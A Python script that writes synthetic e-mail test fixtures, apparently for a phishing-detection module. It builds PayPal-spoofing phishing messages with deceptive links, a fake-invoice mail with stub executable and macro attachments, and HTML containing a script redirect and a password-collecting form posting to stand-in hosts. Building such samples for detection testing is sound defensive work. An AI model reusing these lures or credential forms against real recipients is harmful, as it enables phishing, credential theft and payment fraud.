"""Generates SYNTHETIC test e-mails for Module 4 tests.

These are hand-built test fixtures, not real messages and not training data.
Domains use reserved/example names or obviously fictitious .xyz/.top hosts.
Re-run:  python tests/fixtures/email/make_fixtures.py"""
import base64
import io
import os
import zipfile
from email.message import EmailMessage
from email.utils import formataddr

HERE = os.path.dirname(os.path.abspath(__file__))


def w(name, data):
    with open(os.path.join(HERE, name), "wb") as f:
        f.write(data if isinstance(data, bytes) else data.encode())


# 1. Legitimate, authenticated newsletter-style message
w("legit_authenticated.eml", """Return-Path: <bounces+123@mail.example.com>
Received: from mail.example.com (mail.example.com [93.184.215.14])
        by mx.recipient-provider.test with ESMTPS id abc123
        for <alice@recipient.test>; Tue, 22 Sep 2026 10:15:02 +0000
Authentication-Results: mx.recipient-provider.test;
       spf=pass smtp.mailfrom=mail.example.com;
       dkim=pass header.d=example.com header.s=s1;
       dmarc=pass (p=REJECT) header.from=example.com
DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=s1; h=from:to:subject:date; bh=abc=; b=def=
From: Example Team <team@example.com>
To: Alice <alice@recipient.test>
Subject: Your September account summary
Date: Tue, 22 Sep 2026 10:15:00 +0000
Message-ID: <20260922101500.abc@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

Hi Alice,

Here is your monthly summary. You can review it any time by signing in at https://www.example.com/account.

Thanks,
The Example Team
""")

# 2. Phishing: PayPal display name, Reply-To diversion, auth failures, deceptive link, HTML attachment
html = """<html><body>
<p>Dear Customer,</p>
<p>We noticed unusual sign-in activity. Your account has been limited. You must verify your account
within 24 hours or it will be suspended permanently.</p>
<p><a href="http://paypal-security.xyz/login?session=8812">https://www.paypal.com/signin</a></p>
<p>Please confirm your password to restore access.</p>
</body></html>"""
m = EmailMessage()
m["Return-Path"] = "<bounce@mailer.paypal-security.xyz>"
m["Received"] = ("from mailer.paypal-security.xyz (unknown [203.0.113.45]) by mx.recipient-provider.test "
                 "with ESMTP id zz9; Wed, 23 Sep 2026 08:01:10 +0000")
m["Authentication-Results"] = ("mx.recipient-provider.test; spf=fail smtp.mailfrom=mailer.paypal-security.xyz; "
                               "dkim=none; dmarc=fail (p=REJECT) header.from=paypal.com")
m["From"] = formataddr(("PayPal Security", "security@paypal.com"))
m["Reply-To"] = "support@paypal-security.xyz"
m["To"] = "victim@recipient.test"
m["Subject"] = "Urgent: your account has been limited"
m["Date"] = "Wed, 23 Sep 2026 08:01:00 +0000"
m["Message-ID"] = "<a1b2c3@mailer.paypal-security.xyz>"
m.set_content("Dear Customer, we noticed unusual sign-in activity. Verify your account within 24 hours: http://paypal-security.xyz/login")
m.add_alternative(html, subtype="html")
m.add_attachment(b"<html><form action='http://paypal-security.xyz/p'><input type='password'></form></html>",
                 maintype="text", subtype="html", filename="Invoice.pdf.html")
w("phish_paypal.eml", bytes(m))

# 3. Missing optional headers (no Date, Message-ID, auth)
w("missing_headers.eml", "From: someone@example.org\nTo: bob@recipient.test\nSubject: hello\n\nJust checking in about Friday.\n")

# 4. Malformed: header block is garbage but it is text
w("malformed.eml", "This is not really an email\n@@@@ ::: \n\x01\x02 random bytes? no\nFrom nowhere\n")

# 5. Attachment: zip containing an executable + macro-enabled document with VBA project
zbuf = io.BytesIO()
with zipfile.ZipFile(zbuf, "w") as z:
    z.writestr("invoice_0923.exe", b"MZ" + b"\x00" * 64)       # 66 bytes, not a real program
    z.writestr("readme.txt", b"see attached")
docm = io.BytesIO()
with zipfile.ZipFile(docm, "w") as z:
    z.writestr("[Content_Types].xml", "<Types/>")
    z.writestr("word/document.xml", "<w:document/>")
    z.writestr("word/vbaProject.bin", b"\x00fake-vba-marker")
m = EmailMessage()
m["From"] = formataddr(("Accounts Payable", "ap@vendor-billing.top"))
m["To"] = "finance@recipient.test"
m["Subject"] = "Outstanding invoice - payment overdue"
m["Date"] = "Wed, 23 Sep 2026 09:00:00 +0000"
m["Message-ID"] = "<inv-77@vendor-billing.top>"
m.set_content("Hello, the outstanding invoice is attached. Please open the attachment and enable content to view. "
              "Payment is overdue; wire transfer to our new bank account today.")
m.add_attachment(zbuf.getvalue(), maintype="application", subtype="zip", filename="invoice.zip")
m.add_attachment(docm.getvalue(), maintype="application", subtype="vnd.ms-word.document.macroEnabled.12", filename="Remittance.docm")
w("attachments.eml", bytes(m))

# 6. HTML with scripts, form, hidden text, tracking pixel
m = EmailMessage()
m["From"] = "alerts@notice-center.example.net"
m["To"] = "user@recipient.test"
m["Subject"] = "Mailbox storage full"
m["Date"] = "Wed, 23 Sep 2026 09:30:00 +0000"
m.set_content("Your mailbox is full.")
m.add_alternative("""<html><body><script>document.location='http://198.51.100.7/x'</script>
<div style="display:none">lorem ipsum filler text to confuse filters lorem ipsum filler</div>
<form action="http://198.51.100.7/collect" method="post"><input type="email"><input type="password"></form>
<img src="http://tracker.example.net/p.gif" width="1" height="1">
<a href="http://bit.ly/3xyz" onclick="x()">Upgrade storage</a></body></html>""", subtype="html")
w("html_script.eml", bytes(m))

# 7. Encoded content: RFC 2047 subject + base64 body
body = base64.b64encode("Bonjour, votre facture est disponible: https://docs.example.org/f/123".encode()).decode()
w("encoded.eml", f"""From: =?utf-8?B?w4lxdWlwZSBGYWN0dXJhdGlvbg==?= <billing@example.org>
To: client@recipient.test
Subject: =?utf-8?Q?Votre_facture_=E2=80=94_septembre?=
Date: Wed, 23 Sep 2026 07:00:00 +0200
Message-ID: <enc1@example.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

{body}
""")

# 8. Suspicious display name embedding another address
w("display_spoof.eml", """From: "service@paypal.com" <helpdesk@account-alerts.top>
To: user@recipient.test
Subject: Action required
Date: Wed, 23 Sep 2026 06:00:00 +0000
Message-ID: <x@account-alerts.top>

Please review your recent transaction.
""")

# 9. Multiple URLs including IP and shortener
w("multi_urls.eml", """From: news@example.org
To: user@recipient.test
Subject: Links
Date: Wed, 23 Sep 2026 06:00:00 +0000
Message-ID: <m@example.org>

See https://www.example.org/a , http://192.0.2.10/login , https://bit.ly/abc123 and www.example.com/b.
""")

# 10. Body only (no headers)
w("body_only.txt", "Dear customer, your account will be suspended. Verify your password immediately at http://secure-login.example.xyz/verify\n")

# 11. Binary (.msg-like OLE header)
w("outlook.msg", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 512)
print("fixtures written to", HERE)
